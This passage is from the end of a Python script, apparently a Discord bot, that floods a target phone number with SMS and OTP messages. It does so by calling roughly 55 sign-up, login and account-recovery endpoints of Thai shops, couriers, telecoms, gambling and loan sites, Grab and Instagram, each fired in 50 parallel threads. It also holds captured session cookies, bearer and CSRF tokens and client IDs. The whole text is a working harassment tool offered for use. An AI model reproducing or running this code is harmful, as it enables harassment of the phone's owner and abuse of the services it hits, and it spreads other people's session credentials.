                                                                         "referer": "https://m.lavagame168.com/dashboard/login"},
                  json={"brands_id": "5ffc0caa4d603200124e4eb1", "agent_register": "5ffc0d5cdcd4f30012aec3d9",
                        "tel": phone})


 def api11():
     requests.get("https://m.redbus.id/api/getOtp?number=" + phone[1:] + "&cc=66&whatsAppOpted=true",
                  headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01",
                           "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text


 def api12():
    requests.post("https://api.myfave.com/api/fave/v3/auth", headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
                  json={"phone": "66" + phone})


 def api13():
    requests.post("https://samartbet.com/api/request/otp", data={"phoneNumber": phone,
                                                                 "token": "HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"})


 def api14():
    requests.post("https://www.msport1688.com/auth/send_otp", data={"phone": phone})


 def api15():
    requests.post("http://b226.com/x/code", data={f"phone": phone})


 def api16():
    requests.post("https://ep789bet.net/auth/send_otp", data={"phone": phone})


 def api17():
    requests.post("https://www.berlnw.com/reservelogin", data={"p_myreserve": phone},
                  headers={"Host": "www.berlnw.com", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
                           "Content-Type": "application/x-www-form-urlencoded", "Save-Data": "on",
                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                           "Referer": "https://www.berlnw.com/myaccount", "Accept-Encoding": "gzip, deflate, br",
                           "Accept-Language": "th-TH,th;q=0.9,en;q=0.8",
                           "Cookie": "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"})


 def api18():
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
                  json={"on": {"value": phone, "country": "66"}, "type": "mobile"})


 def api19():
    requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")


 def api20():
    requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})


 def api21():
    requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number": phone})


 def api22():
    requests.post("https://unacademy.com/api/v3/user/user_check/", json={"phone": phone, "country_code": "TH"},
                  headers={}).json()


 def api23():
    requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone})


 def api24():
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
                  json={"username": phone, "password": "6302814184624az", "name": "0903281894", "provinceCode": "28",
                        "districtCode": "393", "subdistrictCode": "3494", "zipcode": "40260",
                        "siebelCustomerTypeId": "710", "acceptTermAndCondition": "true", "hasSeenConsent": "false",
                        "locale": "th_TH"})


 def api25():
    requests.post("https://store.boots.co.th/api/v1/guest/register/otp", json={"phone_number": phone})


 def api26():
    requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",
                  data=f"email_or_username={phone}&recaptcha_challenge_field=",
                  headers={"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest",
                           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
                           "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json


 def api27():
    requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/" + phone)


 def api28():
    requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},
                  json={"phone_no": phone})


 def api29():
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp",
                  json={"client_id": "4ddf78ade8324462988fec5bfc5874c2", "transaction_ctx": "null",
                        "country_code": "TH", "method": "SMS", "num_digits": "6",
                        "scope": "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile",
                        "phone_number": phone}, headers={})


 def api30():
    requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone})


 def api31():
    requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone",
                  data={"phone": phone, "password": "123456789Az"})


 def api32():
    requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", headers={
        "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
        "content-type": "application/x-amz-json-1.1", "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
        "x-amz-user-agent": "aws-amplify/0.1.x js", "referer": "https://www.bugaboo.tv/members/signup/phone"},
                  json={"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{phone[1:]}", "Password": "098098Az",
                        "UserAttributes": [{"Name": "name", "Value": "Dbdh"},
                                           {"Name": "birthdate", "Value": "2005-01-01"},
                                           {"Name": "gender", "Value": "Male"},
                                           {"Name": "phone_number", "Value": f"+66{phone[1:]}"},
                                           {"Name": "custom:phone_country_code", "Value": "+66"},
                                           {"Name": "custom:is_agreement", "Value": "true"},
                                           {"Name": "custom:allow_consent", "Value": "true"},
                                           {"Name": "custom:allow_person_info", "Value": "true"}],
                        "ValidationData": []})
    requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", headers={"cache-control": "max-age=0",
                                                                                "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                                                                                "content-type": "application/x-amz-json-1.1",
                                                                                "x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode",
                                                                                "x-amz-user-agent": "aws-amplify/0.1.x js",
                                                                                "referer": "https://www.bugaboo.tv/members/resetpass/phone"},
                  json={"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{phone[1:]}"})


 def api33():
    head = {
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer": "https://laopun.com/register",
        "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"
    }
    requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153", headers=head)


 def api34():
    requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number": phone})


 def api35():
    head = {
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
        "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
    }
    requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head,
                  json={"username": phone, "optType": 0}).json()


 def api36():
    head = {
        "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
        "content-type": "application/json; charset=utf-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "accept": "*/*",
        "referer": "https://nocnoc.com/login",
        "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
    }
    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684", headers=head,
                  json={"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": phone,
                        "type": "signup", "otpTemplate": "buyer_signup_otp_message",
                        "userParams": {"buyerName": "ฟงฟง ฟงฟว"}})


 def api37():
    requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId": "39816-1633012470",
                                                                        "params": {"phone": phone, "language": "en-US",
                                                                                   "route": "sms",
                                                                                   "devId": "ic1rtwz1s1Hj1O0r",
                                                                                   "application": "icq"}})


 def api38():
    requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone, 'language': "th"})


 def api39():
    requests.post("https://gccircularlivingshop.com/sms/sendOtp",
                  json={"grant_type": "otp", "username": phone, "password": "", "client": "ecommerce"}, headers={})


 def api40():
    headers = {
        "organizationcode": "lifestyle",
        "content-type": "application/json"
    }
    json = {"operationName": "sendOtp", "variables": {"input": {"mobileNumber": phone, "phoneCode": "THA-66"}},
            "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}
    requests.post("https://graph.firster.com/graphql", headers=headers, json=json)


 def api41():
    requests.post("https://m.riches666.com/api/register-otp",
                  data={"brands_id": "60a6563a232a600012521982", "agent_register": "60a76a7f233d2900110070e0",
                        "tel": phone})


 def api42():
    head = {
        "x-requested-with": "XMLHttpRequest",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "accept": "*/*",
        "referer": "https://www.pruksa.com/member/register/otp_code",
        "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
    }
    requests.post("https://www.pruksa.com/member/member_otp/re_create", headers=head,
                  data=f"required=otp&mobile={phone}")


 def api43():
    head = {
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "referer": "https://vaccine.trueid.net/",
        "cookie": "tids=cj6rr5kfn7n5eq48kjvtjshbmm6fl822;visid_incap_2104120=tLQf04X9QQOCL3N5NvNoVFt6lGEAAAAAQUIPAAAAAACBOqMUEW78XaYnxR7kJ7pF;_ga_id=908257605.1637120616;_gcl_au=1.1.781159093.1639210714;_fbp=fb.1.1639210716826.1287073338;visid_incap_2608850=sCqytT60R3yHmHPZaoQgs9WLuGEAAAAAQUIPAAAAAADemRF44I7x0AvVgLWDt3rL;pbjs-pubCommonId=4764c6cc-f296-45a4-873a-5cd0bd43510e;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;unique_user_id=332651712.1639210715;__gads=ID=abe63e684890d998:T=1639484401:S=ALNI_MbXUWyQkNhtJ2m57vxHz6ORO4bxRg;_ga=GA1.2.332651712.1639210715;_gid=GA1.2.465629380.1639888137;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B513FC64.8;_ctout26068=1;verify=test;OptanonConsent=isIABGlobal=false&datestamp=Sun+Dec+19+2021+11%3A29%3A09+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1&geolocation=%3B&AwaitingReconsent=false;OptanonAlertBoxClosed=2021-12-19T04:29:09.733Z;_ga_R05PJC3ZG8=GS1.1.1639888134.6.1.1639888160.34"
    }
    requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp", headers=head,
                  json={"msisdn": phone, "function": "enroll"})


 def api44():
    head = {
        "x-requested-with": "XMLHttpRequest",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "*/*",
        "referer": "https://ufa108.ufabetcash.com/register.php",
        "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
    }
    requests.post("https://ufa108.ufabetcash.com/api/", headers=head,
                  data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")


 def api45():
    requests.post("https://www.mrcash.top/h5/LoginMessage_ultimate", data={"phone": phone, "type": "2", "ctype": "1"})


 def api46():
    requests.post("https://www.qqmoney.ltd/jackey/sms/login",
                  json={"appId": "5fc9ff297eb51f1196350635", "companyId": "5fc9ff12197278da22aff029", "mobile": phone},
                  headers={"Content-Type": "application/json;charset=UTF-8"})


 def api47():
    requests.post("https://www.monomax.me/api/v2/signup/telno", json={"password": "12345678+", "telno": phone})


 def api48():
    requests.post("https://m.pgwin168.com/api/register-otp",
                  json={"brands_id": "60e4016f35119800184f34a5", "agent_register": "60e57c3b2ead950012fc5fba",
                        "tel": phone})


 def api49():
    requests.post("https://www.som777.com/api/otp/register", json={"applicant": phone, "serviceName": "SOM777"})


 def api50():
    requests.post("https://www.konglor888.com/api/otp/register", json={"applicant": phone, "serviceName": "KONGLOR888"})


 def api51():
    requests.get(
        "https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone=" + phone + "&img_code=",
        headers={"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip",
                 "User-Agent": "okhttp/3.11.0"})


 def api52():
    requests.get("https://users.cars24.co.th/oauth/consumer-app/otp/" + phone + "?lang=th",
                 headers={"accept": "application/json, text/plain, */*", "x_vehicle_type": "CAR",
                          "cookie": "_ga=GA1.3.523508414.1640152799;_gid=GA1.3.999851247.1640152799;_fbp=fb.2.1640152801502.837786780;_gac_UA-65843992-28=1.1640152807.EAIaIQobChMIi9jVo9329AIVizArCh1bFAuMEAAYASAAEgJqA_D_BwE;_dc_gtm_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjYwMjMzZjYyLTFlMzYtNWZmMy04MjZkLTMzOTAxNTMwODQ4NyIsImNyZWF0ZWQiOjE2NDAxNTI4MDEzMDYsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6ImI4MDNlNTFkLTFiYTYtNGExZi05MGIzLTk5OWRmMjhhM2RiOCIsImNyZWF0ZWQiOjE2NDAxNjY4ODgwNDF9;_hjAbsoluteSessionInProgress=0;cto_bundle=uVFzcF8lMkYxM0hsRGxQc1M4YThaRmhHJTJGRTBtSUdwNzVuRkVldzI5QlpIYktWbnZFcUlzdDZ1ZnhMT3JqVVhFQyUyQmtGUE9MTFk5akpyVnl4ekZnZlJ4UVN3WnRHdUNyJTJGWW03aVRSeWtLc2wxTjA3QmR0THNzcjNsJTJCcEJHSXlOUzNxTVc2ZmJPaGclMkZhRUhkV3I2cTI1dXUlMkZhYnl1dyUzRCUzRA"})


 def api53():
    requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data={"phone_number": phone, "lag": " "})


 def api54():
    requests = Session()
    token = search('<meta name="_csrf" content="(.*)" />',
                   requests.get("https://www.shopat24.com/register/").text).group(1)
    requests.post("https://www.shopat24.com/register/ajax/requestotp/", data=f"phoneNumber={phone}",
                  headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-csrf-token": token})


 def api55():
    head = {
        "Host": "srfng.ais.co.th",
        "Connection": "keep-alive",
        "Content-Length": "67",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent":
            "Mozilla/5.0 (Linux; Android 9.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/5.0 Chrome/85.0.4183.127 Mobile Safari/537.30",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://srfng.ais.co.th",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://srfng.ais.co.th/8WXNShEVNCGn0o3%2BN6pPqiW5KfoLSNBvVqkqoQCl%2Bc4%3D?channel=webview&redirectURL=http%3A%2F%2Fakdev.vidnt.com&httpGenerate=generated",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": "_chunk=1; ol3-0=po2YOaPtZc%252BHZHeVG7D7ZG%252BLV3UUNnejYANfRIc2aJod7cBWn4witm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545pslib3M%252FI2DYESmolC484IfK0uXD5D0rC%252Fo5%252FO%252BMvAmKevq9L6vW8pFbvG%252B5q%252BBInKvYPJ%252BOxCyzMixWbOUnOW4axJtZp3grN474ew9v4UFkdU8VUGoXKVhldzaK9%252BxYuJBdY2Jfzqf%252FsVIYv3uE4RmGzzoeCrQ7QXZm0uH6t3j1yF63KOQX4QwOmpG526ym0Sh%252BXLWQFhxnbuquuA8N7cumFvTTi7oWHt4W8mJQ4IN1GvS0iHlBQHgvnEkjGRlCtB%252FJ07aNkfBWlLrwb1zgQI88OkOrtTDDUdsIUSVdy7r5pOILz6rcT8kC%252FGqneTshPK9RF4PHxrBSDIPlQIVXJI6dxsiAr5H3UfAAa5FsfN8samV5qyQTgm3s9SC4w83uM1twiFJtarImPcx41vDFL7NF4yy7Ej7eSY%252FFyqLQuoCKDPhxlyOaH8mRoseOkpdQI0Bp4z75t0NlP%252B4YIV4EKmRueIktZmOk5c0I1SLC3bZ240Wshg7rbP6IgtwFEzWrOoIAGpfWHDjYjI8oiMpQX98aBtbtZA9sKvIDrY%252FdQqDsP4vDSPy3n1zb8pXhqaKLkDaAWih%252Ba6BX3FkEdn4fPrzZrNPfuHRC3hfSV51Jz4t3RxTPUlOS8goU8VSmQF%252F9wQEaLAkVR3F4sGzn1GH1fesp46wBbSOSkWNCEIu%252F%252B1VTElnOqnPSntHsUmow7jMst3uCb7Z9mNj%252Bo4RQM0oEuf39FLtPgIWMfYBXSEQXOXUeO2%252BYXI9OUFORSQBJy1kZcTPw2gjR4ZYrkaWKgqCo5jtIclLeDiLqzdBKYjupRC3%252BFXgL0SDchuE%252BD3XaNJ1YH2SVg0UzxbOIg6aIBxcIhakpSZw2w0jjPL1c1YG%252BAgVvT%252BeNL%252FzHr%252FeiqQkFjNI%252F64fvurU75Qy53GSlOBBvQTMhg0q11qYi4QMaxf2V%252FQ1TY3QLnfXiYKCq60Gh9gSACyjrf8thXVYUYheRWz2jM%252BotOvz%252FZwIbXf4SPGR71PK7X%252F2a30w01XgOvYf9dxC%252F9pWn4yNxgl%252BPhoIXK%252Fj%252FQRofkDIdzr1VJ0%252Bq6aX66IuSuytQAwWsoB"
    }
    requests.post("https://srfng.ais.co.th/login/sendOneTimePW", data={"msisdn": phone}, headers=head)
 for i in range(50):
    threading.Thread(target=api1).start()
    threading.Thread(target=apidis).start()
    threading.Thread(target=apitrue).start()
    threading.Thread(target=api2).start()
    threading.Thread(target=api3).start()
    threading.Thread(target=api4).start()
    threading.Thread(target=api5).start()
    threading.Thread(target=api6).start()
    threading.Thread(target=api7).start()
    threading.Thread(target=api8).start()
    threading.Thread(target=api9).start()
    threading.Thread(target=api10).start()
    threading.Thread(target=api11).start()
    threading.Thread(target=api12).start()
    threading.Thread(target=api13).start()
    threading.Thread(target=api14).start()
    threading.Thread(target=api15).start()
    threading.Thread(target=api16).start()
    threading.Thread(target=api17).start()
    threading.Thread(target=api18).start()
    threading.Thread(target=api19).start()
    threading.Thread(target=api20).start()
    threading.Thread(target=api21).start()
    threading.Thread(target=api22).start()
    threading.Thread(target=api23).start()
    threading.Thread(target=api24).start()
    threading.Thread(target=api25).start()
    threading.Thread(target=api26).start()
    threading.Thread(target=api27).start()
    threading.Thread(target=api28).start()
    threading.Thread(target=api29).start()
    threading.Thread(target=api30).start()
    threading.Thread(target=api31).start()
    threading.Thread(target=api32).start()
    threading.Thread(target=api33).start()
    threading.Thread(target=api34).start()
    threading.Thread(target=api35).start()
    threading.Thread(target=api36).start()
    threading.Thread(target=api37).start()
    threading.Thread(target=api38).start()
    threading.Thread(target=api39).start()
    threading.Thread(target=api40).start()
    threading.Thread(target=api41).start()
    threading.Thread(target=api42).start()
    threading.Thread(target=api43).start()
    threading.Thread(target=api44).start()
    threading.Thread(target=api45).start()
    threading.Thread(target=api46).start()
    threading.Thread(target=api47).start()
    threading.Thread(target=api48).start()
    threading.Thread(target=api49).start()
    threading.Thread(target=api50).start()
    threading.Thread(target=api51).start()
    threading.Thread(target=api52).start()
    threading.Thread(target=api53).start()
    threading.Thread(target=api54).start()
    threading.Thread(target=api55).start()
 await ctx.channel.send(f"ขณะนี้ยิงเบอร์ `{phone}` เสร็จแล้ว !!!")
bot.run(token)
